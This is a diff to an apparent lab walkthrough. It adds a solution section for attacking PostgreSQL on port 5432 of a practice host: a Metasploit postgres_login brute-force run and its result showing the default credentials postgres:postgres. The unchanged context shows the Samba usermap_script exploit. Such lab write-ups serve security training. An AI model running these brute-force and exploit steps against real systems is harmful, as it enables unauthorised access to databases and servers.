@@ -58,6 +58,7 @@ run
 ```
 
 With the information we now have we can use:
+
 ```markdown
 use exploit/multi/samba/usermap_script
 
@@ -78,4 +79,29 @@ To verify our access:
 whoami
 ```
 
+</details>
+
+Port 5432 PostgreSQL
+
+
+<details>
+<summary>Solution</summary>
+
+First we brute force the password:
+
+```markdown
+use auxiliary/scanner/postgres/postgres_login
+
+set RHOSTS 10.0.0.3
+
+set STOP_ON_SUCCESS true
+
+run
+```
+
+The result of the brute force attack:
+
+```markdown
+Success: postgres:postgres (Database 'template1' succeeded.)
+```
 </details>
